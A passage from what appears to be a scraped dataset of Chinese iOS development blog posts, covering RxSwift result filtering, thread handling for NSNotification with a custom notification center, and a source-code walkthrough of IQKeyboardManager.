    static func request(api: (T) -&gt; Target) -&gt; (Result&lt;T&gt;) -&gt; Observable&lt;Result&lt;JSON&gt;&gt; {
        return { result in
            switch result {
            case .value(let object):
                return request(api: api)(object)
            case let .error(error):
                return Observable.just(Result.error(error))
            }
        }
    }
    /// 过滤出 Result 中的 value
    static var filterValue: (Result&lt;T&gt;) -&gt; Observable&lt;T&gt; {
        return { result in
            switch result {
            case .value(let object):
                return Observable.just(object)
            case .error:
                return Observable.empty()
            }
        }
    }
    /// 过滤出 Result 中的 error
    static var filterError: (Result&lt;T&gt;) -&gt; Observable&lt;ErrorProtocol&gt; {
        return { result in
            switch result {
            case .value:
                return Observable.empty()
            case let .error(error):
                return Observable.just(error)
            }
        }
    }
}
</code></pre>
<p>这里我表示所有的方法都是用给 Rx 中 <code>flatMap</code> 操作的。</p>
<blockquote>
<p>关于为什么 <code>FlatMap</code> 中会有 <code>filter</code> ，您可以参考这篇文章 <a href=""http://blog.dianqk.org/2016/04/07/%E7%94%A8%E6%9B%B4%20Swifty%20%E7%9A%84%E4%BB%A3%E7%A0%81%E9%81%8D%E5%8E%86%E6%95%B0%E6%8D%AE/%20"" rel=""nofollow noreferrer""> 用更 Swifty 的代码遍历数据 </a>。</p>
<p>这里还有一篇美团的 FRP 实践 <a href=""http://williamzang.com/blog/2016/06/27/ios-kai-fa-xia-de-han-shu-xiang-ying-shi-bian-cheng/%20"" rel=""nofollow noreferrer""> iOS开发下的函数响应式编程 </a> ，不论您是用 RAC 还是 Rx ，都值得看一看。</p>
</blockquote>

                ", 在实践中应用 RxSwift,1531972019,280,1,556,1,1,https://segmentfault.com/a/1190000005915774
97,1,0,6,"
                    
<h2>背景</h2>
<p>ios 的 notification 在多线程的情况下，线程的管理非常不好控制。这个怎么理解呢？</p>
<p>按照官方文档的说法就是，不管你在哪个线程注册了 observer，notification 在哪个线程 post，那么它就将在哪个线程接收，这个意思用代码表示，效果如下：</p>
<pre><code>- (void)viewDidLoad {
    [super viewDidLoad];
    NSLog(@""current thread = %@"", [NSThread currentThread]);
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(handleNotification:) name:POST_NOTIFICATION object:nil];
    
}

- (void)viewDidAppear:(BOOL)animated {
    [self postNotificationInBackground];
}

- (void)postNotificationInBackground {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        
        [[NSNotificationCenter defaultCenter] postNotificationName:POST_NOTIFICATION object:nil userInfo:nil];
    });
}

- (void)handleNotification:(NSNotification *)notification {
     NSLog(@""current thread = %@"", [NSThread currentThread]);
}</code></pre>
<p>输出如下：</p>
<pre><code>2016-07-02 11:20:56.683 Test[31784:3602420] current thread = &lt;NSThread: 0x7f8548405250&gt;{number = 1, name = main}
2016-07-02 11:20:56.684 Test[31784:3602420] viewWillAppear: ViewController
2016-07-02 11:20:56.689 Test[31784:3602469] current thread = &lt;NSThread: 0x7f854845b790&gt;{number = 2, name = (null)}</code></pre>
<p>也就是说，尽管我在主线程注册了 observer，但是由于我在子线程 post 了消息，那么 handleNotification 响应函数也会在子线程处理。这样一来就会给我们带来困扰，因为 notification 的响应函数执行线程将变得不确定，而且很多操作如 UI 操作，我们是需要在主线程进行的。</p>
<h2>解决方案</h2>
<p>怎么解决这个问题呢？</p>
<h3>在响应函数处强制切线程</h3>
<h5>实现</h5>
<p>一个很土的方法就在在 handleNotification 里面，强制切换线程，如:</p>
<pre><code>- (void)handleNotification:(NSNotification *)notification {
   dispatch_async(dispatch_get_main_queue(), ^{
      NSLog(@""current thread = %@"", [NSThread currentThread]);
   });
}</code></pre>
<h5>缺陷</h5>
<p>每一个响应函数都强制切换线程。这样带来的问题就是每一处理代码你都得这样做，对于开发者而言负担太大，显然是下下策。</p>
<h3>线程重定向</h3>
<p>其实解决思路和上面的差不多，不过实现的方式更优雅一点，这个方案在 <a href=""https://developer.apple.com/library/mac/documentation/Cocoa/Conceptual/Notifications/Articles/Threading.html#//apple_ref/doc/uid/20001289-CEGJFDFG"" rel=""nofollow noreferrer"">apple 的官方文档</a>中有详细介绍，它的思路翻译过来就是:重定向通知的一种的实现思路是使用一个通知队列(注意，不是 NSNotificationQueue 对象，而是一个数组)去记录所有的被抛向非预期线程里面的通知，然后将它们重定向到预期线程。这种方案使我们仍然是像平常一样去注册一个通知的观察者，当接收到 Notification 的时候，先判断 post 出来的这个 Notification 的线程是不是我们所期望的线程，如果不是，则将这个 Notification 存储到我们自定义的队列中，并发送一个信号( signal )到期望的线程中，来告诉这个线程需要处理一个 Notification 。指定的线程在收到信号后，将 Notification 从队列中移除，并进行处理。</p>
<h5>实现</h5>
<pre><code>/* Threaded notification support. */
@property (nonatomic) NSMutableArray    *notifications;         // 通知队列
@property (nonatomic) NSThread          *notificationThread;    // 预想的处理通知的线程
@property (nonatomic) NSLock            *notificationLock;      // 用于对通知队列加锁的锁对象，避免线程冲突
@property (nonatomic) NSMachPort        *notificationPort;      // 用于向预想的处理线程发送信号的通信端口

@end

@implementation ViewController

 - (void)viewDidLoad {
    [super viewDidLoad];
    
    NSLog(@""current thread = %@"", [NSThread currentThread]);
    
    [self setUpThreadingSupport];
    
    // 往当前线程的run loop添加端口源
    // 当Mach消息到达而接收线程的run loop没有运行时，则内核会保存这条消息，直到下一次进入run loop
    [[NSRunLoop currentRunLoop] addPort:self.notificationPort
                                forMode:(__bridge NSString *)kCFRunLoopCommonModes];
    
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(processNotification:) name:POST_NOTIFICATION object:nil];
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        
        [[NSNotificationCenter defaultCenter] postNotificationName:POST_NOTIFICATION object:nil userInfo:nil];
        
    });
}

 - (void) setUpThreadingSupport {
    if (self.notifications) {
        return;
    }
    self.notifications      = [[NSMutableArray alloc] init];
    self.notificationLock   = [[NSLock alloc] init];
    self.notificationThread = [NSThread currentThread];
    
    self.notificationPort = [[NSMachPort alloc] init];
    [self.notificationPort setDelegate:self];
    [[NSRunLoop currentRunLoop] addPort:self.notificationPort
                                forMode:(__bridge NSString*)kCFRunLoopCommonModes];
}

 - (void)handleMachMessage:(void *)msg {
    
    [self.notificationLock lock];
    
    while ([self.notifications count]) {
        NSNotification *notification = [self.notifications objectAtIndex:0];
        [self.notifications removeObjectAtIndex:0];
        [self.notificationLock unlock];
        [self processNotification:notification];
        [self.notificationLock lock];
    };
    
    [self.notificationLock unlock];
}

 - (void)processNotification:(NSNotification *)notification {
    
    if ([NSThread currentThread] != _notificationThread) {
        // Forward the notification to the correct thread.
        [self.notificationLock lock];
        [self.notifications addObject:notification];
        [self.notificationLock unlock];
        [self.notificationPort sendBeforeDate:[NSDate date]
                                   components:nil
                                         from:nil
                                     reserved:0];
    }
    else {
        // Process the notification here;
        NSLog(@""current thread = %@"", [NSThread currentThread]);
        NSLog(@""process notification"");
    }
}
}</code></pre>
<p>但是这种方案有明显额缺陷，官方文档也对其进行了说明，归结起来有两点：</p>
<ul>
<li><p>所有的通知的处理都要经过 processNotification 函数进行处理。</p></li>
<li><p>所有的接听对象都要提供相应的 NSMachPort 对象，进行消息转发。</p></li>
</ul>
<p>正是由于存在这样的缺陷，因此官方文档并不建议直接这样使用，而是鼓励开发者去继承NSNoticationCenter 或者自己去提供一个单独的类进行线程的维护。</p>
<h3>block 方式的 NSNotification</h3>
<p>为了顺应语法的变化，apple 从 ios4 之后提供了带有 block 的 NSNotification。使用方式如下：</p>
<pre><code> - (id&lt;NSObject&gt;)addObserverForName:(NSString *)name
                            object:(id)obj
                             queue:(NSOperationQueue *)queue
                        usingBlock:(void (^)(NSNotification *note))block</code></pre>
<p>这里说明几点</p>
<ul>
<li><p>观察者就是当前对象</p></li>
<li><p>queue 定义了 block 执行的线程，nil 则表示 block 的执行线程和发通知在同一个线程</p></li>
<li><p>block 就是相应通知的处理函数</p></li>
</ul>
<p>这个 API 已经能够让我们方便的控制通知的线程切换。但是，这里有个问题需要注意。就是其 remove 操作。</p>
<p>首先回忆一下我们原来的 NSNotification 的 remove 方式，见如下代码：</p>
<pre><code>- (void)removeObservers {
    [[NSNotificationCenter defaultCenter] removeObserver:self name:POST_NOTIFICATION object:nil];
}</code></pre>
<p>需要指定 observer 以及 name。但是带 block 方式的 remove 便不能像上面这样处理了。其方式如下：</p>
<pre><code>- (void)removeObservers {
    if（_observer）{
        [[NSNotificationCenter defaultCenter] removeObserver:_observer];
    }
}</code></pre>
<p>其中 _observer 是 addObserverForName 方式的 api 返回观察者对象。这也就意味着，你需要为每一个观察者记录一个成员对象，然后在 remove 的时候依次删除。试想一下，你如果需要 10 个观察者，则需要记录 10 个成员对象，这个想想就是很麻烦，而且它还不能够方便的指定 observer 。因此，理想的做法就是自己再做一层封装，将这些细节封装起来。</p>
<h2>LRNotificationObserver</h2>
<p>git 上有一个想要解决上述问题的开源代码，其使用方式如下：</p>
<pre><code>+ (void)observeName:(NSString *)name
              owner:(id)owner
      dispatchQueue:(dispatch_queue_t)dispatchQueue
              block:(LRNotificationObserverBlock)block;</code></pre>
<p>它能够方便的控制线程切换，而且它还能做到 owner dealloc 的时候，自动 remove observer。比如我们很多时候在 viewDidLoad 的时候addObserver，然后还需要重载 dealloc，在里面调用 removeObserver，这个开源方案，帮我们省去了再去dealloc 显示 remove 的额外工作。但是如果你想显式的调用 remove，就比较麻烦了（比如有时候，我们在viewWillAppear 添加了 observer，需要在 viewWillDisAppear 移除 observer），它类似官方的解决方案，需要你用成员变量，将 observer 一个个保存下来，然后在 remove 的地方移除。</p>
<h2>GYNotificationCenter</h2>
<p>为了解决上面的问题，因此决定重新写一个 Notification 的管理类，<a href=""https://github.com/zachwangb/GYNotificationCenter"" rel=""nofollow noreferrer"">GYNotificationCenter</a> 想要达到的效果有两个</p>
<ol>
<li><p>能够方便的控制线程切换</p></li>
<li><p>能够方便的remove observer</p></li>
</ol>
<h3>使用</h3>
<pre><code>- (void)addObserver:(nonnull id)observer
              name:(nonnull NSString *)aName
     dispatchQueue:(nullable dispatch_queue_t)disPatchQueue
             block:(nonnull GYNotificatioObserverBlock)block;</code></pre>
<p>我们提供了和官方 api 几乎一样的调用方法，支持传入 dispatchQueue 实现线程切换控制，同时能够以 block 的方式处理消息响应，而且支持在 observer dealloc 的时候，自动调用 observer 的 remove 操作。同时还提供了和原生一样的显式调用 remove 的操作，方便收到调用 remove .</p>
<pre><code>- (void)removerObserver:(nonnull id)observer
                   name:(nonnull NSString *)anName
                 object:(nullable id)anObject;

- (void)removerObserver:(nonnull id)observer;</code></pre>
<p>能够方便的手动调用 remove 操作。</p>
<h3>实现思路</h3>
<p>GYNotificaionCenter 借鉴了官方的线程重定向 以及 LRNotificationObserver 的一些方案。在 addObserver 的时候，生成了一个和 observer 关联的 GYNotificationOberverIdentifer 对象，这个对象记录了传入的 block 、name 的数据，然后对这个对象依据传入的 name 注册观察者。</p>
<pre><code>[[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(handleNotification:) name:anName object:object];</code></pre>
<p>当收到通知的时候，在 handleNotification 里面执行传入的 block，回调的外面去。</p>
<pre><code>- (void)handleNotification:(NSNotification *)notification {
    
    if (self.dispatchQueue) {
        dispatch_async(self.dispatchQueue, ^{
            if (self.block) {
                self.block(notification);
            }
        });
    } else {
        self.block(notification);
    }   
}</code></pre>
<p>GYNotificationOberverIdentifer 对象放入 GYNotificationOberverIdentifersContainer 对象中进行统一管理。</p>
<pre><code>- (void)addNotificationOberverIdentifer:(GYNotificationOberverIdentifer *)identifier {
    
    NSAssert(identifier,@""identifier is nil"");
    if (identifier) {
        NotificationPerformLocked(^{
            [self modifyContainer:^(NSMutableDictionary *notificationOberverIdentifersDic) {
                //不重复add observer
                if (![notificationOberverIdentifersDic objectForKey:identifier.name]) {
                    [notificationOberverIdentifersDic setObject:identifier forKey:identifier.name];
                }
            }];
        });
    }
    
}</code></pre>
<p>这个对象也和 observer 关联。由于其和 observer 是关联的，因此当 observer 释放的时候，GYNotificationOberverIdentifer 也会释放，因此，也就能在 GYNotificationOberverIdentifer 的 dealloc 里面调用 remove 操作移除通知注册从而实现自动 remove。</p>
<p>同时由于 GYNotificationOberverIdentifersContainer 里面保留了所有的 Identifer 对象，因此也就能够方便的根据 name 进行 remove 了。</p>
<pre><code>- (void)removeObserverWithName:(NSString *)name {
    
    if (name) {
        NotificationPerformLocked(^{
            [self modifyContainer:^(NSMutableDictionary *notificationOberverIdentifersDic) {
                
                if ([notificationOberverIdentifersDic objectForKey:name]) {
                    GYNotificationOberverIdentifer *identifier = (GYNotificationOberverIdentifer *)[notificationOberverIdentifersDic objectForKey:name];
                    [identifier stopObserver];
                    [notificationOberverIdentifersDic removeObjectForKey:name];
                }
            }];

        });
    }
}</code></pre>

                ", NSNotification 线程管理以及自动注销开源方案,1531972021,566,1,92,1,1,https://segmentfault.com/a/1190000005889055
98,1,0,6,"
                    
<blockquote>
<p>关注仓库，及时获得更新：<a href=""https://github.com/draveness/iOS-Source-Code-Analyze"" rel=""nofollow noreferrer"">iOS-Source-Code-Analyze</a></p>
<p>Follow: <a href=""https://github.com/Draveness"" rel=""nofollow noreferrer"">Draveness · Github</a></p>
</blockquote>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006767630"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<blockquote><p>这篇文章会对 IQKeyboardManager 自动解决键盘遮挡问题的方法进行分析。</p></blockquote>
<p>最近在项目中使用了 <a href=""https://github.com/hackiftekhar/IQKeyboardManager"" rel=""nofollow noreferrer"">IQKeyboardManager</a> 来解决 <code>UITextField</code> 被键盘遮挡的问题，这个框架的使用方法可以说精简到了极致，只需要将 <code>IQKeyboardManager</code> 加入 <code>Podfile</code>，然后 <code>pod install</code> 就可以了。</p>
<pre><code class=""objectivec"">pod 'IQKeyboardManager'</code></pre>
<p>这篇文章的题目《零行代码解决键盘遮挡问题》来自于开源框架的介绍：</p>
<blockquote><p>Codeless drop-in universal library allows to prevent issues of keyboard sliding up and cover UITextField/UITextView. Neither need to write any code nor any setup required and much more.</p></blockquote>
<p>因为在项目中使用了 IQKeyboardManager，所以，我想通过阅读其源代码来了解这个黑箱是如何工作的。</p>
<blockquote><p>虽然这个框架的实现的方法是比较简单的，不过它的实现代码不是很容易阅读，框架因为包含了很多与 UI 有关的实现细节，所以代码比较复杂。</p></blockquote>
<h2>架构分析</h2>
<p>说是架构分析，其实只是对 <a href=""https://github.com/hackiftekhar/IQKeyboardManager"" rel=""nofollow noreferrer"">IQKeyboardManager</a> 中包含的类以及文件有一个粗略地了解，研究一下这个项目的层级是什么样的。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000005772666"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""IQKeyboardManager-Hierarchy"" title=""IQKeyboardManager-Hierarchy""></span></p>
<p>整个项目中最核心的部分就是 <code>IQKeyboardManager</code> 这个类，它负责<strong>管理键盘出现或者隐藏时视图移动的距离</strong>，是整个框架中最核心的部分。</p>
<p>在这个框架中还有一些用于支持 IQKeyboardManager 的分类，以及显示在键盘上面的 IQToolBar：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000005772705"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""IQToolBa"" title=""IQToolBa""></span></p>
<p>使用红色标记的部分就是 <code>IQToolBar</code>，左侧的按钮可以在不同的 <code>UITextField</code> 之间切换，中间的文字是 <code>UITextField.placeholderText</code>，右边的 <code>Done</code> 应该就不需要解释了。</p>
<p>这篇文章会主要分析 <code>IQKeyboardManager</code> 中解决的问题，会用小篇幅介绍包含占位符（Placeholder） <code>IQTextView</code> 的实现。</p>
<h2>IQTextView 的实现</h2>
<p>在具体研究如何解决键盘遮挡问题之前，我们先分析一下框架中最简单的一部分 <code>IQTextView</code> 是如何为 <code>UITextView</code> 添加占位符的。</p>
<pre><code class=""objectivec"">@interface IQTextView : UITextView

@end</code></pre>
<p><code>IQTextView</code> 继承自 <code>UITextView</code>，它只是在 <code>UITextView</code> 上添加上了一个 <code>placeHolderLabel</code>。</p>
<p>在初始化时，我们会为 <code>UITextViewTextDidChangeNotification</code> 注册通知：</p>
<pre><code class=""objectivec"">- (void)initialize   {
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(refreshPlaceholder) name:UITextViewTextDidChangeNotification object:self];
}</code></pre>
<p>在每次 UITextView 中的 text 更改时，就会调用 <code>refreshPlaceholder</code> 方法更新 <code>placeHolderLabel</code> 的 <code>alpha</code> 值来隐藏或者显示 label：</p>
<pre><code class=""objectivec"">-(void)refreshPlaceholder {
    if ([[self text] length]) {
        [placeHolderLabel setAlpha:0];
    } else {
        [placeHolderLabel setAlpha:1];
    }
    
    [self setNeedsLayout];
    [self layoutIfNeeded];
}</code></pre>
<h2>IQKeyboardManager</h2>
<p>下面就会进入这篇文章的正题：<code>IQKeyboardManager</code>。</p>
<p>如果你对 iOS 开发比较熟悉，可能会发现每当一个类的名字中包含了 <code>manager</code>，那么这个类可能可能遵循单例模式，<code>IQKeyboardManager</code> 也不例外。</p>
<h3>IQKeyboardManager 的初始化</h3>
<p>当 <code>IQKeyboardManager</code> 初始化的时候，它做了这么几件事情：</p>
<ol>
<li>
<p>监听有关键盘的通知</p>
<pre><code class=""objectivec"">[[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(keyboardWillShow:) name:UIKeyboardWillShowNotification object:nil];
[[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(keyboardWillHide:) name:UIKeyboardWillHideNotification object:nil];
[[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(keyboardDidHide:) name:UIKeyboardDidHideNotification object:nil];</code></pre>
</li>
<li>
<p>注册与 <code>UITextField</code> 以及 <code>UITextView</code> 有关的通知</p>
<pre><code class=""objectivec"">[self registerTextFieldViewClass:[UITextField class]
 didBeginEditingNotificationName:UITextFieldTextDidBeginEditingNotification
   didEndEditingNotificationName:UITextFieldTextDidEndEditingNotification];

[self registerTextFieldViewClass:[UITextView class]
 didBeginEditingNotificationName:UITextViewTextDidBeginEditingNotification
   didEndEditingNotificationName:UITextViewTextDidEndEditingNotification];</code></pre>
<ul><li>
<p>调用的方法将通知绑定到了 <code>textFieldViewDidBeginEditing:</code> 和 <code>textFieldViewDidEndEditing:</code> 方法上</p>
<pre><code class=""objectivec"">- (void)registerTextFieldViewClass:(nonnull Class)aClass
  didBeginEditingNotificationName:(nonnull NSString *)didBeginEditingNotificationName
    didEndEditingNotificationName:(nonnull NSString *)didEndEditingNotificationName {
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(textFieldViewDidBeginEditing:) name:didBeginEditingNotificationName object:nil];
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(textFieldViewDidEndEditing:) name:didEndEditingNotificationName object:nil];
}</code></pre>
</li></ul>
</li>
<li>
<p>初始化一个 <code>UITapGestureRecognizer</code>，在点击 <code>UITextField</code> 对应的 <code>UIWindow</code> 的时候，收起键盘</p>
<pre><code class=""objectivec"">strongSelf.tapGesture = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(tapRecognized:)];</code></pre>
</li>
</ol>
<pre><code class=""objectivec"">- (void)tapRecognized:(UITapGestureRecognizer*)gesture {
    if (gesture.state == UIGestureRecognizerStateEnded)
        [self resignFirstResponder];
}</code></pre>
<ol>
<li>
<p>初始化一些默认属性，例如键盘距离、覆写键盘的样式等</p>
<pre><code class=""objectivec"">strongSelf.animationDuration = 0.25;
strongSelf.animationCurve = UIViewAnimationCurveEaseInOut;
[self setKeyboardDistanceFromTextField:10.0];
[self setShouldPlayInputClicks:YES];
[self setShouldResignOnTouchOutside:NO];
[self setOverrideKeyboardAppearance:NO];
[self setKeyboardAppearance:UIKeyboardAppearanceDefault];
[self setEnableAutoToolbar:YES];
[self setPreventShowingBottomBlankSpace:YES];
[self setShouldShowTextFieldPlaceholder:YES];
[self setToolbarManageBehaviour:IQAutoToolbarBySubviews];
[self setLayoutIfNeededOnUpdate:NO];</code></pre>
</li>
<li>
<p>设置不需要解决键盘遮挡问题的类</p>
<pre><code class=""objectivec"">strongSelf.disabledDistanceHandlingClasses = [[NSMutableSet alloc] initWithObjects:[UITableViewController class], nil];
strongSelf.enabledDistanceHandlingClasses = [[NSMutableSet alloc] init];

strongSelf.disabledToolbarClasses = [[NSMutableSet alloc] init];
strongSelf.enabledToolbarClasses = [[NSMutableSet alloc] init];

strongSelf.toolbarPreviousNextAllowedClasses = [[NSMutableSet alloc] initWithObjects:[UITableView class],[UICollectionView class],[IQPreviousNextView class], nil];

strongSelf.disabledTouchResignedClasses = [[NSMutableSet alloc] init];
strongSelf.enabledTouchResignedClasses = [[NSMutableSet alloc] init];</code></pre>
</li>
</ol>
<p>整个初始化方法大约有几十行的代码，在这里就不再展示整个方法的全部代码了。</p>
<h3>基于通知的解决方案</h3>
<blockquote><p>在这里，我们以 UITextField 为例，分析方法的调用流程。</p></blockquote>
<p>在初始化方法中，我们注册了很多的通知，包括键盘的出现和隐藏，<code>UITextField</code> 开始编辑与结束编辑。</p>
<pre><code class=""objectivec"">UIKeyboardWillShowNotification
UIKeyboardWillHideNotification
UIKeyboardDidHideNotification
UITextFieldTextDidBeginEditingNotification
UITextFieldTextDidEndEditingNotification</code></pre>
<p>在这些通知响应时，会执行以下的方法：</p>
<p>| Notification | Selector |<br>|:-:|:-:|<br>| <code>UIKeyboardWillShowNotification</code> | <code>@selector(keyboardWillShow:)</code>|<br>| <code>UIKeyboardWillHideNotification</code> | <code>@selector(keyboardWillHide:)</code> |<br>| <code>UIKeyboardDidHideNotification</code> | <code>@selector(keyboardDidHide:)</code> |<br>|<code>UITextFieldTextDidBeginEditingNotification</code>|<code>@selector(textFieldViewDidBeginEditing:)</code>|<br>|<code>UITextFieldTextDidEndEditingNotification</code>|<code>@selector(textFieldViewDidEndEditing:)</code>|</p>
<p>整个解决方案其实都是基于 iOS 中的通知系统的；在事件发生时，调用对应的方法做出响应。</p>
<h3>开启 Debug 模式</h3>
<p>在阅读源代码的过程中，我发现 <code>IQKeyboardManager</code> 提供了 <code>enableDebugging</code> 这一属性，可以通过开启它，来追踪方法的调用，我们可以在 Demo 加入下面这行代码：</p>
<pre><code class=""objectivec"">[IQKeyboardManager sharedManager].enableDebugging = YES;</code></pre>
<h2>键盘的出现</h2>
<p>然后运行工程，在 Demo 中点击一个 <code>UITextField</code></p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000005772707"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""easiest-integration-demo"" title=""easiest-integration-demo""></span></p>
<p>上面的操作会打印出如下所示的 Log：</p>
<pre><code class=""objectivec"">IQKeyboardManager: ****** textFieldViewDidBeginEditing: started ******
IQKeyboardManager: adding UIToolbars if required
IQKeyboardManager: Saving &lt;UINavigationController 0x7f905b01b000&gt; beginning Frame: {{0, 0}, {320, 568}}
IQKeyboardManager: ****** adjustFrame started ******
IQKeyboardManager: Need to move: -451.00
IQKeyboardManager: ****** adjustFrame ended ******
IQKeyboardManager: ****** textFieldViewDidBeginEditing: ended ******
IQKeyboardManager: ****** keyboardWillShow: started ******
IQKeyboardManager: ****** adjustFrame started ******
IQKeyboardManager: Need to move: -154.00
IQKeyboardManager: ****** adjustFrame ended ******
IQKeyboardManager: ****** keyboardWillShow: ended ******</code></pre>
<p>我们可以通过分析 <code>- textFieldViewDidBeginEditing:</code> 以及 <code>- keyboardWillShow:</code> 方法来了解这个项目的原理。</p>
<h3>textFieldViewDidBeginEditing:</h3>
<p>当 <code>UITextField</code> 被点击时，方法 <code>- textFieldViewDidBeginEditing:</code> 被调用，但是注意这里的方法并不是代理方法，它只是一个跟代理方法同名的方法，根据 Log，它做了三件事情：</p>
<ul>
<li><p>为 <code>UITextField</code> 添加 <code>IQToolBar</code></p></li>
<li><p>在调整 frame 前，保存当前 frame，以备之后键盘隐藏后的恢复</p></li>
<li><p>调用 <code>- adjustFrame</code> 方法，将视图移动到合适的位置</p></li>
</ul>
<h4>添加 ToolBar</h4>
<p>添加 ToolBar 是通过方法 <code>- addToolbarIfRequired</code> 实现的，在 <code>- textFieldViewDidBeginEditing:</code> 先通过 <code>- privateIsEnableAutoToolbar</code> 判断 ToolBar 是否需要添加，再使用相应方法 <code>- addToolbarIfRequired</code> 实现这一目的。</p>
<p>这个方法会根据根视图上 <code>UITextField</code> 的数量执行对应的代码，下面为一般情况下执行的代码：</p>
<pre><code class=""objectivec"">- (void)addToolbarIfRequired {
    NSArray *siblings = [self responderViews];
    for (UITextField *textField in siblings) {
        [textField addPreviousNextDoneOnKeyboardWithTarget:self previousAction:@selector(previousAction:) nextAction:@selector(nextAction:) doneAction:@selector(doneAction:) shouldShowPlaceholder:_shouldShowTextFieldPlaceholder];
        textField.inputAccessoryView.tag = kIQPreviousNextButtonToolbarTag;

        IQToolbar *toolbar = (IQToolbar*)[textField inputAccessoryView];
        toolbar.tintColor = [UIColor blackColor];
        [toolbar setTitle:textField.drawingPlaceholderText];
        [textField setEnablePrevious:NO next:YES];
    }
}</code></pre>
<p>在键盘上的 <code>IQToolBar</code> 一般由三部分组成：</p>
<ul>
<li><p>切换 <code>UITextField</code> 的箭头按钮</p></li>
<li><p>指示当前 <code>UITextField</code> 的 placeholder</p></li>
<li><p>Done Button</p></li>
</ul>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000005772711"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""IQToolBarIte"" title=""IQToolBarIte""></span></p>
<blockquote><p>这些 item 都是 <code>IQBarButtonItem</code> 的子类</p></blockquote>
<p>这些 <code>IQBarButtonItem</code> 以及 <code>IQToolBar</code> 都是通过方法 <code>- addPreviousNextDoneOnKeyboardWithTarget:previousAction:nextAction:doneAction:</code> 或者类似方法添加的：</p>
<pre><code class=""objectivec"">- (void)addPreviousNextDoneOnKeyboardWithTarget:(id)target previousAction:(SEL)previousAction nextAction:(SEL)nextAction doneAction:(SEL)doneAction titleText:(NSString*)titleText {
    IQBarButtonItem *prev = [[IQBarButtonItem alloc] initWithImage:imageLeftArrow style:UIBarButtonItemStylePlain target:target action:previousAction];
    IQBarButtonItem *next = [[IQBarButtonItem alloc] initWithImage:imageRightArrow style:UIBarButtonItemStylePlain target:target action:nextAction];
    IQTitleBarButtonItem *title = [[IQTitleBarButtonItem alloc] initWithTitle:self.shouldHideTitle?nil:titleText];
    IQBarButtonItem *doneButton =[[IQBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemDone target:target action:doneAction];

    IQToolbar *toolbar = [[IQToolbar alloc] init];
    toolbar.barStyle = UIBarStyleDefault;
    toolbar.items = @[prev, next, title, doneButton];
    toolbar.titleInvocation = self.titleInvocation;
    [(UITextField*)self setInputAccessoryView:toolbar];
}</code></pre>
<p>上面是方法简化后的实现代码，初始化需要的 <code>IQBarButtonItem</code>，然后将这些 <code>IQBarButtonItem</code> 全部加入到 <code>IQToolBar</code> 上，最后设置 <code>UITextField</code> 的 <code>accessoryView</code>。</p>
<h4>保存 frame</h4>
<p>这一步的主要目的是为了在键盘隐藏时恢复到原来的状态，其实现也非常简单：</p>
<pre><code class=""objectivec"">_rootViewController = [_textFieldView topMostController];
_topViewBeginRect = _rootViewController.view.frame;</code></pre>
<p>获取 <code>topMostController</code>，在 <code>_topViewBeginRect</code> 中保存 <code>frame</code>。</p>
<h4>adjustFrame</h4>
<p>在上述的任务都完成之后，最后就需要调用 <code>- adjustFrame</code> 方法来调整当前根试图控制器的 <code>frame</code> 了：</p>
<blockquote>
<p>我们只会研究一般情况下的实现代码，因为这个方法大约有 400 行代码对不同情况下的实现有不同的路径，包括有 <code>lastScrollView</code>、含有 <code>superScrollView</code> 等等。</p>
<p>而这里会省略绝大多数情况下的实现代码。</p>
</blockquote>
<pre><code class=""objectivec"">- (void)adjustFrame {
    UIWindow *keyWindow = [self keyWindow];
    UIViewController *rootController = [_textFieldView topMostController];    
    CGRect textFieldViewRect = [[_textFieldView superview] convertRect:_textFieldView.frame toView:keyWindow];
    CGRect rootViewRect = [[rootController view] frame];
    CGSize kbSize = _kbSize;
    kbSize.height += keyboardDistanceFromTextField;
    CGFloat topLayoutGuide = CGRectGetHeight(statusBarFrame);
    CGFloat move = MIN(CGRectGetMinY(textFieldViewRect)-(topLayoutGuide+5), CGRectGetMaxY(textFieldViewRect)-(CGRectGetHeight(keyWindow.frame)-kbSize.height));
    
    if (move &gt;= 0) {
        rootViewRect.origin.y -= move;
        [self setRootViewFrame:rootViewRect];
    } else {
        CGFloat disturbDistance = CGRectGetMinY(rootViewRect)-CGRectGetMinY(_topViewBeginRect);
        if (disturbDistance &lt; 0) {
            rootViewRect.origin.y -= MAX(move, disturbDistance);
            [self setRootViewFrame:rootViewRect];
        }
    }
}</code></pre>
<p>方法 <code>- adjustFrame</code> 的工作分为两部分：</p>
<ol>
<li><p>计算 <code>move</code> 的距离</p></li>
<li>
<p>调用 <code>- setRootViewFrame:</code> 方法设置 <code>rootView</code> 的大小</p>
<pre><code class=""objectivec"">- (void)setRootViewFrame:(CGRect)frame {
    UIViewController *controller = [_textFieldView topMostController];    
    frame.size = controller.view.frame.size;

    [UIView animateWithDuration:_animationDuration delay:0 options:(_animationCurve|UIViewAnimationOptionBeginFromCurrentState) animations:^{
        [controller.view setFrame:frame];
    } completion:NULL];
}</code></pre>
</li>
</ol>
